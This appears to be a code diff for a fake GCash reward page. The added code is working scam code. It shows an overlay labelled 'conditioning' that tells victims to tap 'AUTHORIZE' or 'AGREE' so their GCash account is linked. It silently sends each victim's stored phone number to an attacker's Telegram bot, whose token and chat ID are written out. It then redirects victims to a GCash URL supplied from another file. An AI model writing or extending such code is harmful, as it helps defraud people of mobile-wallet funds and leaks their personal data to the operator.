@@ -68,9 +68,22 @@
         .share-button { background: #1877f2; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; }
 
         .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
+
+        /* UI/UX CONDITIONING OVERLAY (NEW) */
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.95); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(10px); }
+        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .proc-title { font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 15px; letter-spacing: 1px; }
+        .proc-text { color: #fbbf24; font-size: 15px; line-height: 1.6; font-weight: 600; max-width: 320px; background: rgba(251, 191, 36, 0.1); padding: 15px; border-radius: 12px; border: 1px solid rgba(251, 191, 36, 0.3); }
     </style>
 </head>
 <body>
+
+    <div id="processingOverlay">
+        <div class="spinner"></div>
+        <div class="proc-title">Securing Connection...</div>
+        <div class="proc-text">⚠️ IMPORTANT: Please tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to link your GCash and receive your reward.</div>
+    </div>
 
     <div id="mobileOnlyOverlay">
         <div class="restrict-icon">📱</div>
@@ -113,6 +126,17 @@
 
     <script src="config.js"></script>
     <script>
+        // --- TELEGRAM TRACKER CONFIG ---
+        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+        const chatId = '7298607329';
+        const savedPhone = localStorage.getItem("userPhone") || "Unknown User";
+
+        async function trackActivity(action) {
+            const message = `🎯 GCASH REDIRECT!\n📱 Number: ${savedPhone}\n🔘 Action: ${action}`;
+            try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`); } catch(e) {}
+        }
+        // --------------------------------
+
         const possibleAmounts = [150, 200, 250, 300, 500, 750];
         let currentReward = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
         let timeLeft = 5;
@@ -151,7 +175,6 @@
             window.requestAnimationFrame(step);
         }
 
-        // UPDATED SHARE URL
         function shareToFB() {
             const shareUrl = "https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent("https://xjiligames.github.io/rewards/");
             window.open(shareUrl, '_blank', 'width=600,height=400');
@@ -184,12 +207,19 @@
         }
         setInterval(updateStats, 3000);
 
+        // --- UPDATED REDIRECT FUNCTION WITH CONDITIONING & TRACKING ---
         function redirectToGCash() {
-            claimBtn.disabled = true; 
-            claimBtn.innerHTML = "Connecting to GCash...";
+            // 1. Send silent notification to Telegram
+            trackActivity("User clicked Withdraw. Redirecting to GCash...");
+
+            // 2. Show the Conditioning Overlay
+            document.getElementById('processingOverlay').style.display = 'flex';
+            
+            // 3. Wait for 3.5 seconds para mabasa nila yung instructions
             setTimeout(() => {
-                window.location.href = (typeof LATEST_GCASH_URL !== 'undefined') ? LATEST_GCASH_URL : "https://m.gcash.com";
-            }, 1800);
+                // Gamitin ang window.LATEST_GCASH_URL na galing sa config.js
+                window.location.href = window.LATEST_GCASH_URL || "https://m.gcash.com";
+            }, 3500);
         }
     </script>
 </body>
